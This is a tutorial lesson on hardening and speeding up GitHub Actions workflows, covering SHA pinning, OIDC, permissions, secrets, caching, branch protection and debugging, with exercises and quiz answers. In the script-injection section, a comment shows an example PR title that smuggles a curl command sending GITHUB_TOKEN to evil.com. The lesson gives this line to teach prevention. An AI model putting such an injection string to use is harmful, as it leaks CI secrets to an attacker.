# GitHub Actions Best Practices

## Why This Matters in DevOps

A workflow that works is not the same as a workflow that is secure, fast, and maintainable. In production, your GitHub Actions workflows handle secrets, deploy to critical infrastructure, and run thousands of times a month. A poorly secured workflow leaks credentials. A slow workflow wastes developer time and CI minutes. A poorly structured workflow breaks when you least expect it.

These best practices are the difference between workflows that survive real-world conditions and workflows that become liabilities. Every recommendation here comes from incidents that actually happened — supply chain attacks, leaked secrets, runaway costs, and debugging nightmares.

---

## Core Concepts

### Security Hardening

**Pin action versions with SHA hashes:**

```yaml
# INSECURE — tags can be moved to malicious code
- uses: actions/checkout@v4

# SECURE — SHA is immutable
- uses: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608  # v4.1.0
```

In January 2024, the `tj-actions/changed-files` action was compromised, affecting thousands of repositories. Pinning to SHA would have prevented the attack from propagating.

Use Dependabot to keep SHA pins updated:

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
    commit-message:
      prefix: "ci"
```

**OIDC for cloud authentication (no long-lived secrets):**

```yaml
permissions:
  id-token: write
  contents: read

steps:
  - uses: aws-actions/configure-aws-credentials@v4
    with:
      role-to-assume: arn:aws:iam::123456789012:role/GitHubActionsRole
      aws-region: us-east-1
      # No access keys stored as secrets!
```

AWS IAM trust policy for OIDC:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"
      },
      "Action": "sts:AssumeRoleWithWebIdentity",
      "Condition": {
        "StringEquals": {
          "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
        },
        "StringLike": {
          "token.actions.githubusercontent.com:sub": "repo:myorg/myrepo:ref:refs/heads/main"
        }
      }
    }
  ]
}
```

**Least-privilege permissions:**

```yaml
# INSECURE — default permissions are too broad
# (no permissions block = read/write everything)

# SECURE — explicit, minimal permissions
permissions:
  contents: read           # Read repository code
  pull-requests: write     # Comment on PRs
  # Everything else is implicitly denied

# Even better — set at organization level:
# Organization → Settings → Actions → General → Workflow permissions
# Select "Read repository contents and packages permissions"
```

**Secrets management:**

```yaml
steps:
  # GOOD — pass secrets as environment variables
  - name: Deploy
    env:
      DB_PASSWORD: ${{ secrets.DB_PASSWORD }}
    run: ./deploy.sh

  # BAD — inline secrets (risk of shell injection)
  - name: Deploy
    run: ./deploy.sh --password=${{ secrets.DB_PASSWORD }}

  # GOOD — mask custom values in logs
  - name: Generate token
    run: |
      TOKEN=$(curl -s https://api.example.com/token)
      echo "::add-mask::$TOKEN"
      echo "TOKEN=$TOKEN" >> $GITHUB_ENV
```

**Prevent script injection:**

```yaml
# VULNERABLE — PR title could contain malicious commands
- name: Check title
  run: echo "Title: ${{ github.event.pull_request.title }}"
  # If title is: "; curl evil.com/steal?token=$GITHUB_TOKEN"
  # The shell executes the injected command

# SAFE — use environment variable (no shell interpretation)
- name: Check title
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Title: $PR_TITLE"
```

### Reducing Workflow Runtime

**Path filtering — only run what is needed:**

```yaml
on:
  push:
    paths:
      - 'src/**'
      - 'tests/**'
      - 'requirements*.txt'
      - 'Dockerfile'
    paths-ignore:
      - '**.md'
      - 'docs/**'
      - '.github/ISSUE_TEMPLATE/**'
```

**Effective caching:**

```yaml
# Cache pip with hash-based key
- uses: actions/setup-python@v5
  with:
    python-version: "3.11"
    cache: pip
    cache-dependency-path: |
      requirements.txt
      requirements-dev.txt

# Cache Docker layers
- uses: docker/build-push-action@v5
  with:
    cache-from: type=gha
    cache-to: type=gha,mode=max
```

**Parallel jobs over sequential:**

```yaml
# SLOW — sequential (15 minutes total)
jobs:
  lint-then-test-then-build:
    steps:
      - run: ruff check .        # 2 min
      - run: pytest tests/       # 8 min
      - run: docker build .      # 5 min

# FAST — parallel (8 minutes total)
jobs:
  lint:                          # 2 min ─┐
    steps:                       #         ├── 8 min total
      - run: ruff check .       #         │
  test:                          # 8 min ─┤
    steps:                       #         │
      - run: pytest tests/      #         │
  build:                         # 5 min ─┘
    needs: [lint, test]          # Starts after both finish
    steps:
      - run: docker build .
```

**Cancel outdated PR runs:**

```yaml
concurrency:
  group: ci-${{ github.event.pull_request.number || github.sha }}
  cancel-in-progress: true
```

**Use smaller runner images when possible:**

```yaml
# Full Ubuntu image (larger, more tools pre-installed)
runs-on: ubuntu-latest

# Consider if you really need all pre-installed tools
# Some orgs use custom slim runner images for speed
```

### Monorepo Path Filters

```yaml
# Detect which service changed
jobs:
  detect:
    runs-on: ubuntu-latest
    outputs:
      api: ${{ steps.filter.outputs.api }}
      web: ${{ steps.filter.outputs.web }}
      shared: ${{ steps.filter.outputs.shared }}
    steps:
      - uses: actions/checkout@v4
      - uses: dorny/paths-filter@v3
        id: filter
        with:
          filters: |
            api:
              - 'services/api/**'
            web:
              - 'services/web/**'
            shared:
              - 'libs/shared/**'

  test-api:
    needs: detect
    if: needs.detect.outputs.api == 'true' || needs.detect.outputs.shared == 'true'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: cd services/api && make test

  test-web:
    needs: detect
    if: needs.detect.outputs.web == 'true' || needs.detect.outputs.shared == 'true'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: cd services/web && make test
```

### Branch Protection + Required Checks

Configure in GitHub Settings:

```
Repository → Settings → Branches → Add rule

Branch name pattern: main

✓ Require a pull request before merging
  ✓ Require approvals: 1
  ✓ Dismiss stale pull request approvals when new commits are pushed

✓ Require status checks to pass before merging
  ✓ Require branches to be up to date before merging
  Status checks that are required:
    - lint
    - test
    - security-scan

✓ Require conversation resolution before merging

✓ Do not allow bypassing the above settings
```

This ensures:
- All code goes through PRs (no direct pushes to main)
- PRs must pass CI checks before merging
- At least one reviewer must approve
- Approvals are dismissed when new commits are pushed

### Status Badges

```markdown
<!-- In README.md -->
![CI](https://github.com/org/repo/actions/workflows/ci.yml/badge.svg)
![Deploy](https://github.com/org/repo/actions/workflows/deploy.yml/badge.svg?branch=main)

<!-- With specific branch -->
![Tests](https://github.com/org/repo/actions/workflows/ci.yml/badge.svg?branch=develop)
```

### Notifications

**Slack notifications:**

```yaml
  notify:
    needs: [test, deploy]
    if: always()
    runs-on: ubuntu-latest
    steps:
      - name: Notify Slack on failure
        if: needs.test.result == 'failure' || needs.deploy.result == 'failure'
        uses: slackapi/slack-github-action@v1
        with:
          payload: |
            {
              "text": "Pipeline FAILED for ${{ github.repository }}",
              "blocks": [
                {
                  "type": "section",
                  "text": {
                    "type": "mrkdwn",
                    "text": "*Pipeline Failed* :x:\n*Repository:* ${{ github.repository }}\n*Branch:* ${{ github.ref_name }}\n*Commit:* ${{ github.sha }}\n*Author:* ${{ github.actor }}\n*Run:* <${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}|View>"
                  }
                }
              ]
            }
        env:
          SLACK_WEBHOOK_URL: ${{ secrets.SLACK_WEBHOOK_URL }}
          SLACK_WEBHOOK_TYPE: INCOMING_WEBHOOK

      - name: Notify Slack on success
        if: needs.test.result == 'success' && needs.deploy.result == 'success'
        uses: slackapi/slack-github-action@v1
        with:
          payload: |
            {
              "text": "Deployed ${{ github.repository }}@${{ github.sha }} successfully :white_check_mark:"
            }
        env:
          SLACK_WEBHOOK_URL: ${{ secrets.SLACK_WEBHOOK_URL }}
          SLACK_WEBHOOK_TYPE: INCOMING_WEBHOOK
```

### Debugging Failed Workflows

**Step 1: Read the logs carefully**

```
- Expand the failed step
- Look for the FIRST error, not the last
- Check the exit code (Error: Process completed with exit code 1)
```

**Step 2: Enable debug logging**

```yaml
# Method 1: Re-run with debug logging
# Actions tab → Failed run → Re-run jobs → "Enable debug logging" checkbox

# Method 2: Repository secret
# Settings → Secrets → ACTIONS_STEP_DEBUG = true

# Method 3: In the workflow
env:
  ACTIONS_STEP_DEBUG: true
```

**Step 3: Add diagnostic steps**

```yaml
steps:
  - name: Debug - show environment
    if: failure()
    run: |
      echo "Working directory: $(pwd)"
      echo "Files:"
      ls -la
      echo "Environment:"
      env | sort
      echo "Disk space:"
      df -h
      echo "Memory:"
      free -h
```

**Step 4: Common failure patterns**

```
"Permission denied"
  → Check file permissions, GITHUB_TOKEN permissions, OIDC role trust policy

"Resource not found"
  → Check that referenced secrets/variables exist, check branch names

"Timeout"
  → Job exceeded timeout-minutes, check for infinite loops or hung processes

"Out of disk space"
  → Docker images filling up, large artifacts, missing cleanup steps

"Rate limit exceeded"
  → Too many API calls to external services, add caching or delays
```

### Common Mistakes

**1. Not setting timeout-minutes:**

```yaml
# BAD — no timeout, hung job runs for 6 hours
jobs:
  test:
    runs-on: ubuntu-latest

# GOOD — explicit timeout
jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 15
```

**2. Using secrets in fork PRs:**

```yaml
# Secrets are NOT available in workflows triggered by PRs from forks
# This is a security feature — fork PRs could steal secrets
# Use pull_request_target cautiously if you need secrets for fork PRs
```

**3. Not handling step failures:**

```yaml
# BAD — test report not uploaded if tests fail
- run: pytest tests/ --junitxml=report.xml
- uses: actions/upload-artifact@v4
  with:
    name: test-report
    path: report.xml

# GOOD — upload even on failure
- run: pytest tests/ --junitxml=report.xml
- uses: actions/upload-artifact@v4
  if: always()                    # Upload even if tests failed
  with:
    name: test-report
    path: report.xml
```

**4. Broad trigger patterns:**

```yaml
# BAD — runs on every push to every branch
on: push

# GOOD — specific branches and paths
on:
  push:
    branches: [main]
    paths: ['src/**']
  pull_request:
    branches: [main]
```

---

## Step-by-Step Practical

### Security Audit Checklist for Existing Workflows

Run through this checklist for every workflow in your repository:

```
[ ] Actions pinned to SHA hashes (not tags)
[ ] Dependabot configured for github-actions
[ ] Permissions block set at workflow level (explicit, minimal)
[ ] Secrets passed via env: not inline in run:
[ ] No untrusted input in run: commands (${{ github.event... }})
[ ] OIDC used for cloud auth (no long-lived credentials)
[ ] Fork PR handling is intentional (secrets not leaked)
[ ] Timeout-minutes set on all jobs
[ ] Branch protection with required checks enabled
[ ] Workflow files are code-reviewed via PR

Scoring:
  10/10 — Production-ready
  7-9   — Good, address remaining items
  4-6   — Needs improvement before production
  0-3   — Security risk, fix immediately
```

### Performance Optimization Checklist

```
[ ] Path filters to skip unnecessary runs
[ ] Dependency caching enabled
[ ] Docker layer caching enabled
[ ] Jobs parallelized where possible
[ ] Matrix strategy used instead of duplicated jobs
[ ] Concurrency with cancel-in-progress for PRs
[ ] Artifact retention set (not default 90 days)
[ ] Timeout-minutes set (prevents hung jobs from burning minutes)
[ ] Pre-built base images instead of installing everything from scratch
[ ] Conditional jobs (skip deploy when only docs change)

Current pipeline time: _____ minutes
Target pipeline time:  _____ minutes
```

---

## Exercises

### Exercise 1: Security Audit
Take an existing workflow (or the one you built in previous lessons) and audit it against the security checklist above. Fix every issue you find. Document what each fix prevents.

### Exercise 2: Performance Optimization
Measure your current workflow runtime. Apply three optimizations (caching, parallelization, path filtering) and measure the improvement. Document the before/after times for each change.

### Exercise 3: Slack Notification
Add Slack notifications to a workflow that sends different messages for success and failure. Include the repository name, branch, commit SHA, and a link to the workflow run. Test with both passing and failing builds.

### Exercise 4: Branch Protection
Configure branch protection on a repository with required status checks, required reviews, and conversation resolution. Attempt to push directly to main (it should fail). Open a PR and verify the checks are required.

### Exercise 5: Debugging Exercise
Create a workflow that fails for a non-obvious reason (e.g., a file permission issue, a missing dependency, or a timing-dependent test). Give it to a colleague and have them debug it using the techniques from this lesson. Document the debugging process.

---

## Knowledge Check

### Question 1
Why should you pin GitHub Actions to SHA hashes instead of version tags?

<details>
<summary>Answer</summary>

Version tags (like `v4`) are mutable references in Git — the repository owner can move them to point to different commits at any time. If an attacker gains access to an action's repository, they can modify the `v4` tag to point to malicious code that steals secrets or injects backdoors. SHA hashes are immutable and always reference the exact same code. This was demonstrated in real attacks (e.g., the `tj-actions/changed-files` compromise in 2024). The tradeoff is that SHA hashes do not auto-update with security patches, so you should use Dependabot to propose updates automatically. The SHA-pinned format with a version comment (`actions/checkout@abc123 # v4.1.0`) provides both security and readability.
</details>

### Question 2
How does the `permissions` key improve workflow security?

<details>
<summary>Answer</summary>

The `permissions` key explicitly declares what the `GITHUB_TOKEN` can do within the workflow. Without it, the token has broad default permissions (read/write on many scopes). With explicit permissions, you follow the principle of least privilege: only grant the access the workflow actually needs. For example, a CI workflow only needs `contents: read` to checkout code. A workflow that comments on PRs needs `pull-requests: write`. All unspecified permissions are implicitly denied. This limits the blast radius if a workflow is compromised — an attacker with a token that only has `contents: read` cannot push code, create releases, or modify settings. Set `permissions: {}` (empty) at the workflow level and add specific permissions per job.
</details>

### Question 3
What is the risk of using `pull_request_target` instead of `pull_request`?

<details>
<summary>Answer</summary>

`pull_request_target` runs in the context of the base branch (not the PR branch) and has access to repository secrets. This is dangerous because if a workflow uses `pull_request_target` AND checks out the PR's code (`actions/checkout` with `ref: ${{ github.event.pull_request.head.sha }}`), an attacker can submit a malicious PR that modifies the workflow file or build scripts to exfiltrate secrets. The PR code runs with the base branch's privileges and secret access. `pull_request` is safer because it runs in the fork's context without access to secrets. Only use `pull_request_target` when you specifically need secret access for fork PRs, and never checkout or execute the PR's code when using it.
</details>

### Question 4
What are the key differences in how you should handle concurrency for CI vs CD workflows?

<details>
<summary>Answer</summary>

For CI workflows (testing PRs): use `cancel-in-progress: true` with a group key based on the PR number (`ci-${{ github.event.pull_request.number }}`). When a developer pushes a new commit, the previous CI run for that PR is outdated and should be cancelled to save resources and give faster feedback on the latest code. For CD workflows (deployments): use `cancel-in-progress: false` with a group key based on the target environment (`deploy-production`). Cancelling a deployment in progress could leave infrastructure in a broken state, cause data corruption, or leave state locks. Instead, the new deployment queues and waits for the in-progress one to complete. This ensures every deployment finishes fully.
</details>

### Question 5
A workflow that was working yesterday suddenly fails with "Permission denied" errors. What are the most likely causes and how would you debug them?

<details>
<summary>Answer</summary>

The most likely causes are: (1) GITHUB_TOKEN permissions changed — the repository or organization may have tightened default permissions, or the workflow's `permissions` block was modified in a recent commit; (2) OIDC role trust policy changed — the IAM role's trust conditions may have been updated (different branch restriction, different repository); (3) Secret expired or was rotated — a cloud credential stored as a secret was rotated without updating the secret in GitHub; (4) Repository visibility changed — public/private switch can affect token permissions; (5) Organization policy change — an admin may have restricted Actions permissions. Debugging steps: (a) check the exact error message and which step fails, (b) compare the current workflow file with the last working version (`git diff`), (c) verify secrets still exist in Settings, (d) check organization audit log for policy changes, (e) enable debug logging and re-run, (f) verify OIDC trust policy conditions match the current branch/repo.
</details>
